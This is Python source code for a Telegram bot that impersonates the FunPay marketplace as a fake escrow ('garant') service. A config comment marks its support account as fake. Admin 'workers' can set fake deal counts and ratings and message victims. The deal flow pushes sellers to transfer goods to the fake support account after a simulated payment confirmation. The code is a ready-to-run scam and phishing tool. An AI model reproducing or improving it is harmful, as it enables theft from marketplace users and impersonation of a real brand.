import asyncio
import random
import string
import json
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Конфиг
BOT_TOKEN = "ВАШ_ТОКЕН"
ADMINS_FILE = "admins.txt"
GIF_PATH = "gif"  # папка с гифками
DEAL_SUPPORT = "@helper_deal"  # юзернейм фейк-поддержки

# Инициализация
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Файлы для хранения
DATA_FILE = "data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": {}, "deals": {}, "admins": []}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

data = load_data()

# Загрузка админов
def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# Состояния FSM
class DealStates(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_description = State()
    adding_gram = State()
    adding_card = State()
    entering_card_number = State()

class BuyStates(StatesGroup):
    entering_deal_code = State()

# Вспомогательные функции
def generate_deal_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def format_deal(deal_id, deal_data):
    return f"""Сделка #{deal_id}:
Сумма: {deal_data['amount']} {deal_data['currency_symbol']}
Описание: {deal_data['description']}
Комиссия: 3.0%"""

def format_deal_status(deal_id, deal_data):
    status_text = deal_data.get('status', 'Ожидает оплаты')
    return f"""Сделка #{deal_id}:
Сумма: {deal_data['amount']} {deal_data['currency_symbol']}
Описание: {deal_data['description']}
Комиссия: 3.0%

⭐ Статус сделки: {status_text}"""

# Клавиатуры
def main_menu_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text="👤 Профиль", callback_data="profile"))
    builder.row(InlineKeyboardButton(text="💳 Вывод", callback_data="withdraw"))
    builder.row(InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites"))
    builder.row(InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"))
    builder.row(InlineKeyboardButton(text="🌐 Язык", callback_data="language"))
    builder.row(InlineKeyboardButton(text="🆘 Поддержка", callback_data="support"))
    return builder.as_markup()

def currency_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💎 GRAM", callback_data="currency_gram"))
    builder.row(InlineKeyboardButton(text="💳 Карта", callback_data="currency_card"))
    builder.row(InlineKeyboardButton(text="⭐ Звёзды", callback_data="currency_stars"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    return builder.as_markup()

def requisites_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="➕ Добавить GRAM", callback_data="add_gram"))
    builder.row(InlineKeyboardButton(text="➕ Добавить карту", callback_data="add_card"))
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    return builder.as_markup()

def deal_keyboard(deal_id):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="📤 Поделиться ссылкой", callback_data=f"share_{deal_id}"))
    builder.row(InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal"))
    return builder.as_markup()

def buyer_deal_keyboard(deal_id):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🆘 Поддержка", callback_data=f"support_deal_{deal_id}"))
    builder.row(InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data=f"confirm_transfer_{deal_id}"))
    return builder.as_markup()

def seller_deal_keyboard(deal_id):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🆘 Поддержка", callback_data=f"support_deal_{deal_id}"))
    return builder.as_markup()

# Обработчики команд
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id not in data["users"]:
        data["users"][user_id] = {"deals": 0, "rating": 0, "requisites": {}}
        save_data(data)
    
    # Проверка на админа
    admins = load_admins()
    if user_id in admins:
        await message.answer_animation(
            animation=FSInputFile(f"{GIF_PATH}/start.gif"),
            caption=f"""FunPay | Bot
50 378 пользователей

Приветствую, воркер!

Наши команды:
/buy *код-сделки* – для оплаты сделки
/set_sdel – для установки успешных сделок
/set_ret – для установки рейтинга (в профиле)
/twodeal *юз/айди* – сообщение о второй сделке
/send *текст* *юз/айди* – отправить сообщение
/chat *юз/айди* – выгрузить историю переписки"""
        )
    else:
        await message.answer_animation(
            animation=FSInputFile(f"{GIF_PATH}/start.gif"),
            caption="""FunPay | Bot
50 378 пользователей

FunPay · Официальная ОТС-платформа

Мы предоставляем полностью автоматизированный сервис гаранта для безопасного обмена цифровыми активами.

Почему выбирают нас?
- Средства блокируются в блокчейне — прозрачно и безопасно
- Автоматическая проверка оплаты и передачи товара
- Система рейтинга""",
            reply_markup=main_menu_keyboard()
        )

# Обработка кнопок меню
@dp.callback_query(F.data == "create_deal")
async def create_deal(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "FUNPAY\n\nВыберите валюту сделки:",
        reply_markup=currency_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "requisites")
async def requisites(callback: types.CallbackQuery):
    user_id = str(callback.from_user.id)
    requisites = data["users"].get(user_id, {}).get("requisites", {})
    
    text = "💳 Ваши реквизиты:\n\n"
    if requisites.get("gram"):
        text += f"💎 GRAM: {requisites['gram']}\n"
    if requisites.get("card"):
        text += f"💳 Карта: {requisites['card']}\n"
    if not requisites:
        text += "У вас ещё нет добавленных реквизитов.\n"
    
    text += "\nВыберите действие:"
    
    builder = InlineKeyboardBuilder()
    if requisites.get("gram"):
        builder.row(InlineKeyboardButton(text="🗑 Удалить GRAM", callback_data="del_gram"))
        builder.row(InlineKeyboardButton(text="✏️ Изменить GRAM", callback_data="add_gram"))
    else:
        builder.row(InlineKeyboardButton(text="➕ Добавить GRAM", callback_data="add_gram"))
    
    if requisites.get("card"):
        builder.row(InlineKeyboardButton(text="🗑 Удалить карту", callback_data="del_card"))
        builder.row(InlineKeyboardButton(text="✏️ Изменить карту", callback_data="add_card"))
    else:
        builder.row(InlineKeyboardButton(text="➕ Добавить карту", callback_data="add_card"))
    
    builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="back_main"))
    
    await callback.message.edit_text(text, reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data == "back_main")
async def back_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        """FunPay | Bot
50 378 пользователей

FunPay · Официальная ОТС-платформа

Почему выбирают нас?
- Средства блокируются в блокчейне — прозрачно и безопасно
- Автоматическая проверка оплаты и передачи товара
- Система рейтинга покупателей и продавцов
- Поддержка 24/7

Поддержка: @helper_deal""",
        reply_markup=main_menu_keyboard()
    )
    await callback.answer()

# Обработка валют
@dp.callback_query(F.data == "currency_gram")
async def currency_gram(callback: types.CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    requisites = data["users"].get(user_id, {}).get("requisites", {})
    
    if not requisites.get("gram"):
        await callback.message.edit_text(
            "❗ У вас ещё не добавлен реквизит GRAM!\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить GRAM",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ OK", callback_data="back_requisites")]
            ])
        )
        await callback.answer()
        return
    
    await state.update_data(currency="gram", currency_symbol="💎")
    await state.set_state(DealStates.entering_amount)
    await callback.message.edit_text(
        "FUNPAY\n\nВведите сумму сделки в GRAM:"
    )
    await callback.answer()

@dp.callback_query(F.data == "currency_card")
async def currency_card(callback: types.CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    requisites = data["users"].get(user_id, {}).get("requisites", {})
    
    if not requisites.get("card"):
        await callback.message.edit_text(
            "❗ У вас ещё не добавлен реквизит карты!\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить карту",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ OK", callback_data="back_requisites")]
            ])
        )
        await callback.answer()
        return
    
    await state.update_data(currency="card", currency_symbol="💳")
    await state.set_state(DealStates.entering_amount)
    await callback.message.edit_text(
        "FUNPAY\n\nВведите сумму сделки:"
    )
    await callback.answer()

@dp.callback_query(F.data == "currency_stars")
async def currency_stars(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(currency="stars", currency_symbol="⭐")
    await state.set_state(DealStates.entering_amount)
    await callback.message.edit_text(
        "FUNPAY\n\nВведите сумму сделки в Звёздах:"
    )
    await callback.answer()

# Добавление реквизитов
@dp.callback_query(F.data == "add_gram")
async def add_gram(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.adding_gram)
    await callback.message.edit_text(
        "Укажите адрес кошелька GRAM:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_requisites")]
        ])
    )
    await callback.answer()

@dp.message(DealStates.adding_gram)
async def process_gram(message: types.Message, state: FSMContext):
    user_id = str(message.from_user.id)
    gram_address = message.text.strip()
    
    # Простая проверка формата TON кошелька
    if not gram_address.startswith("UQ") or len(gram_address) < 20:
        await message.answer(
            "⚠️ Вы указали неверный адрес кошелька GRAM!\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст"
        )
        return
    
    data["users"][user_id]["requisites"]["gram"] = gram_address
    save_data(data)
    
    await state.clear()
    await message.answer(
        "✅ Кошелёк GRAM успешно добавлен!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
        ])
    )

@dp.callback_query(F.data == "add_card")
async def add_card(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(DealStates.adding_card)
    await callback.message.edit_text(
        "Укажите номер карты и банк (не обязательно):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_requisites")]
        ])
    )
    await callback.answer()

@dp.message(DealStates.adding_card)
async def process_card(message: types.Message, state: FSMContext):
    user_id = str(message.from_user.id)
    card_data = message.text.strip()
    
    if len(card_data) < 10:
        await message.answer("⚠️ Введите корректный номер карты!")
        return
    
    data["users"][user_id]["requisites"]["card"] = card_data
    save_data(data)
    
    await state.clear()
    await message.answer(
        "✅ Реквизиты карты успешно добавлены!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
        ])
    )

@dp.callback_query(F.data == "back_requisites")
async def back_requisites(callback: types.CallbackQuery):
    await requisites(callback)

# Создание сделки
@dp.message(DealStates.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer("⚠️ Введите корректное число!")
        return
    
    await state.update_data(amount=amount)
    await state.set_state(DealStates.entering_description)
    await message.answer(
        f"FUNPAY\n\nЧто вы предлагаете за {amount} 🤑?"
    )

@dp.message(DealStates.entering_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text.strip()
    if not description:
        await message.answer("⚠️ Введите описание товара!")
        return
    
    data_state = await state.get_data()
    deal_id = generate_deal_code()
    
    deal_data = {
        "seller_id": str(message.from_user.id),
        "amount": data_state["amount"],
        "currency": data_state["currency"],
        "currency_symbol": data_state["currency_symbol"],
        "description": description,
        "status": "Ожидает оплаты",
        "buyer_id": None,
        "created_at": datetime.now().isoformat(),
        "confirmed": False
    }
    
    data["deals"][deal_id] = deal_data
    save_data(data)
    
    await state.clear()
    
    deal_text = f"""✅ Сделка создана!

Номер сделки: #{deal_id}
Сумма: {deal_data['amount']}
Описание: {description}

Ссылка для покупателя:
https://t.me/FunPaySafaryBot?start={deal_id}

Отправьте эту ссылку покупателю для совершения оплаты!"""
    
    await message.answer_animation(
        animation=FSInputFile(f"{GIF_PATH}/deal_created.gif"),
        caption=deal_text,
        reply_markup=deal_keyboard(deal_id)
    )

# Покупка через команду /buy
@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    args = message.text.split()
    if len(args) < 2:
        await message.answer("⚠️ Использование: /buy *код-сделки*")
        return
    
    deal_code = args[1]
    if deal_code.startswith("#"):
        deal_code = deal_code[1:]
    
    if deal_code not in data["deals"]:
        await message.answer("⚠️ Сделка не найдена!")
        return
    
    deal = data["deals"][deal_code]
    
    # Проверяем что покупатель не продавец
    if str(message.from_user.id) == deal["seller_id"]:
        await message.answer("⚠️ Вы не можете купить свою собственную сделку!")
        return
    
    deal["buyer_id"] = str(message.from_user.id)
    save_data(data)
    
    # Отображение сделки покупателю
    requisites = data["users"][deal["seller_id"]].get("requisites", {})
    req_text = ""
    if deal["currency"] == "gram" and requisites.get("gram"):
        req_text = f"- GRAM (сеть TON)\n  Переведите точную сумму на кошелёк:\n  {requisites['gram']}"
    elif deal["currency"] == "card" and requisites.get("card"):
        req_text = f"- Карта\n  {requisites['card']}"
    else:
        req_text = "- Реквизиты не указаны, свяжитесь с продавцом"
    
    deal_text = f"""{format_deal(deal_code, deal)}

Реквизиты для оплаты:
{req_text}

После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!"""
    
    await message.answer_animation(
        animation=FSInputFile(f"{GIF_PATH}/deal_buy.gif"),
        caption=deal_text,
        reply_markup=buyer_deal_keyboard(deal_code)
    )
    
    # Уведомление продавцу
    try:
        await bot.send_message(
            deal["seller_id"],
            f"@{message.from_user.username} присоединился к сделке #{deal_code}!\nУспешных сделок: {data['users'].get(str(message.from_user.id), {}).get('deals', 0)}\n\n⚠️ Не передавайте товар на @helper_deal, пока бот не уведомит покупателя об оплате!"
        )
    except:
        pass

# Подтверждение оплаты (симуляция)
@dp.callback_query(F.data.startswith("confirm_payment_"))
async def confirm_payment(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in data["deals"]:
        await callback.answer("Сделка не найдена!")
        return
    
    deal = data["deals"][deal_id]
    deal["status"] = "покупатель успешно оплатил"
    save_data(data)
    
    # Уведомление продавцу
    try:
        await bot.send_message(
            deal["seller_id"],
            f"Оплата по сделке #{deal_id} успешно получена!\nПродавец получил уведомление"
        )
    except:
        pass
    
    await callback.message.edit_text(
        f"""{format_deal_status(deal_id, deal)}

⚠️ Дождитесь, пока продавец передаст товар на аккаунт @helper_deal, а затем подтвердите это в боте!""",
        reply_markup=buyer_deal_keyboard(deal_id)
    )
    await callback.answer("Оплата подтверждена!")

# Подтверждение передачи продавцом
@dp.callback_query(F.data.startswith("confirm_transfer_"))
async def confirm_transfer(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in data["deals"]:
        await callback.answer("Сделка не найдена!")
        return
    
    deal = data["deals"][deal_id]
    deal["status"] = "покупатель успешно оплатил, продавец подтвердил передачу товара"
    save_data(data)
    
    # Уведомление покупателю
    if deal.get("buyer_id"):
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"""{format_deal_status(deal_id, deal)}

Ожидайте проверки покупателем и подтверждения перевода на аккаунт @helper_deal. Если товар не был передан на @helper_deal, покупатель не сможет подтвердить получение, а вы не получите оплату!""",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🆘 Поддержка", callback_data=f"support_deal_{deal_id}")]
                ])
            )
        except:
            pass
    
    await callback.message.edit_text(
        f"""{format_deal_status(deal_id, deal)}

💎 ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО 💎
❗️@helper_deal❗️
💎 ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО

В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату.
Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости.""",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data=f"final_confirm_{deal_id}")],
            [InlineKeyboardButton(text="🆘 Поддержка", callback_data=f"support_deal_{deal_id}")]
        ])
    )
    await callback.answer()

# Финальное подтверждение (завершение сделки)
@dp.callback_query(F.data.startswith("final_confirm_"))
async def final_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in data["deals"]:
        await callback.answer("Сделка не найдена!")
        return
    
    deal = data["deals"][deal_id]
    deal["status"] = "Сделка успешно завершена"
    deal["confirmed"] = True
    
    # Обновляем статистику продавца
    seller_id = deal["seller_id"]
    data["users"][seller_id]["deals"] = data["users"][seller_id].get("deals", 0) + 1
    save_data(data)
    
    # Уведомление продавцу
    try:
        await bot.send_message(
            seller_id,
            f"""✅ Сделка #{deal_id} успешно завершена!

Ожидайте поступление оплаты на указанный вами ранее кошелёк."""
        )
    except:
        pass
    
    # Уведомление покупателю
    if deal.get("buyer_id"):
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"""✅ Сделка #{deal_id} успешно завершена!

Статус сделки: Сделка успешно завершена"""
            )
        except:
            pass
    
    await callback.message.edit_text(
        f"""✅ Сделка #{deal_id} успешно завершена!

Статус сделки: Сделка успешно завершена""",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_main")]
        ])
    )
    await callback.answer("Сделка завершена!")

# Команды админа
@dp.message(Command("set_sdel"))
async def cmd_set_sdel(message: types.Message):
    user_id = str(message.from_user.id)
    admins = load_admins()
    if user_id not in admins:
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /set_sdel *количество*")
        return
    
    try:
        count = int(args[1])
        data["users"][user_id]["deals"] = count
        save_data(data)
        await message.answer(f"✅ Установлено успешных сделок: {count}")
    except:
        await message.answer("⚠️ Введите число!")

@dp.message(Command("set_ret"))
async def cmd_set_ret(message: types.Message):
    user_id = str(message.from_user.id)
    admins = load_admins()
    if user_id not in admins:
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /set_ret *рейтинг*")
        return
    
    try:
        rating = int(args[1])
        data["users"][user_id]["rating"] = rating
        save_data(data)
        await message.answer(f"✅ Установлен рейтинг: {rating}")
    except:
        await message.answer("⚠️ Введите число!")

@dp.message(Command("send"))
async def cmd_send(message: types.Message):
    user_id = str(message.from_user.id)
    admins = load_admins()
    if user_id not in admins:
        return
    
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /send *текст* *юз/айди*")
        return
    
    target = args[1]
    text = args[2]
    
    try:
        if target.startswith("@"):
            await bot.send_message(target, text)
        else:
            await bot.send_message(int(target), text)
        await message.answer("✅ Сообщение отправлено!")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# Запуск
async def main():
    print("🤖 FunPay Bot запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())